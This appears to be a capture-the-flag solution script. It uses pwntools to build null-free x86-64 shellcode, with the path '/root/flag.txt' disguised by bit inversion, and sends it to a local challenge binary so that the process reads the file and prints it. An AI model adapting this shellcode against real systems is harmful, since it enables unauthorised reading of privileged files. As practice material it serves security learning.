from pwn import *

context.binary = './sh3llc0d3r'
conn = process("./sh3llc0d3r")

def prepare_string(string):
	vals = []
	string += chr(0) * (8 - len(string) % 8)  # Pad the string to be 8-byte aligned
	string = "".join(reversed(string)).encode()  # Reverse the string

	for i in range(0, len(string), 8):
		seg = string[i: min(i + 8, len(string))]  # Extract the given segment
		seg = "0x" + "".join(hex(~char & 0xff)[2:] for char in seg)  # Get the binary inverse in hex for each char
		vals.append(seg)
	
	return vals

seg1, seg2 = prepare_string("/root/flag.txt")

shellcode = asm(f'''
	xor rax, rax
	xor rsi, rsi

	mov rax, {seg1}
	not rax
	push rax
	
	mov rax, {seg2}
	not rax
	push rax
	
	push 2
	pop rax
	
	lea rdi, [rsp]
	syscall
''')

shellcode += asm('''
	push rax
	pop rdi
	xor rax, rax
	xor rdx, rdx
	
	lea rsi, [rsp]
	push 0x77
	pop rdx
	
	syscall
''')

shellcode += asm('''
	xor rdi, rdi
	push 1
	pop rdi
	
	push rax
	pop rdx
	
	xor rax, rax
	add rax, 1
	syscall
''')

with open("sh3llc0d3r", "w+b") as f:
	f.write(shellcode)

conn.recvuntil(b"...\n")
conn.send(shellcode)
conn.recvuntil(b"shellcode.\n\n")
print(conn.recvline())
